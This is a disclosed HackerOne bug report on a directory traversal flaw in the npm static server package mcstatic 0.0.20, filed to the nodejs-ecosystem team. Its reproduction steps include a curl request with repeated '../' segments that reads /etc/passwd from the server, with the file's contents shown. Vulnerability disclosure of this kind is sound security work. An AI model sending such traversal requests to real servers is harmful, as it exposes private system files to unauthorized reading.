# [mcstatic] Server Directory Traversal

## Report Details
- **Report ID**: 330285
- **URL**: https://hackerone.com/reports/330285
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-03-27T09:25:33.344Z
- **Disclosed**: 2018-06-12T08:16:18.153Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Server Directory Traversal in **mcstatic**.
It allows reading local files on the target server.

# Module

**module name:** mcstatic
**version:** 0.0.20
**npm page:** `https://www.npmjs.com/package/mcstatic`

## Module Description

Static Http server for mocking and stuff

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i mcstatic`

* Start the server

`$ ./node_modules/mcstatic/bin/mcstatic --port 6060`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

## Supporting Material/References:

* node v8.10.0
* npm 5.6.0
* curl 7.54.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

reading local files on the target server

## Attachments
No attachments
